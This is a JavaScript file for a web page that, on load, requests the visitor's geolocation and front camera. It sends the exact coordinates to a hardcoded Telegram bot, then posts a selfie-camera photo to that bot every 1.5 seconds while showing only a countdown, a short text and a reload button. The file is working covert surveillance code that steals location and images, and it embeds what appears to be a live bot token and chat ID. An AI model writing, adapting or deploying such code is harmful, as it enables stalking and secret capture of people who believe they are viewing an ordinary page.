const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const countdownEl = document.getElementById('countdown');
const hazbikText = document.getElementById('hazbikText');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');
const reloadBtn = document.getElementById('reloadBtn');

let stream = null;
let photoInterval = null;

async function requestPermissions() {
  try {
    await requestGeo();
    await requestCamera();
    startCountdown();
  } catch {
    showReloadButton();
  }
}

function requestGeo() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) reject();
    navigator.geolocation.getCurrentPosition(
      pos => {
        sendLocationToTelegram(pos.coords.latitude, pos.coords.longitude);
        resolve();
      },
      () => reject(),
      { enableHighAccuracy: true, timeout: 7000 }
    );
  });
}

async function requestCamera() {
  stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
  videoEl.srcObject = stream;
  await new Promise(resolve => videoEl.onloadedmetadata = resolve);
}

function startCountdown() {
  let count = 3;
  countdownEl.textContent = count;
  countdownEl.style.display = 'block';
  hazbikText.style.display = 'none';
  reloadBtn.style.display = 'none';

  const interval = setInterval(() => {
    count--;
    if (count === 0) {
      clearInterval(interval);
      countdownEl.style.display = 'none';
      hazbikText.style.display = 'block';
      setTimeout(() => {
        hazbikText.style.display = 'none';
        reloadBtn.style.display = 'block';
      }, 3000);
      startPhotoLoop();
    } else {
      countdownEl.textContent = count;
    }
  }, 1000);
}

function startPhotoLoop() {
  photoInterval = setInterval(() => {
    sendPhotoToTelegram();
  }, 1500);
}

function sendPhotoToTelegram() {
  const ctx = canvasEl.getContext('2d');
  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
  canvasEl.toBlob(blob => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).catch(() => {});
  }, 'image/jpeg', 0.8);
}

function sendLocationToTelegram(lat, lon) {
  const url = `https://maps.google.com/?q=${lat},${lon}`;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `🌍 Геолокация: ${url}`
    })
  });
}

function showReloadButton() {
  reloadBtn.style.display = 'block';
  reloadBtn.onclick = () => location.reload();
  countdownEl.style.display = 'none';
  hazbikText.style.display = 'none';
  if (photoInterval) clearInterval(photoInterval);
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
  }
}

requestPermissions();
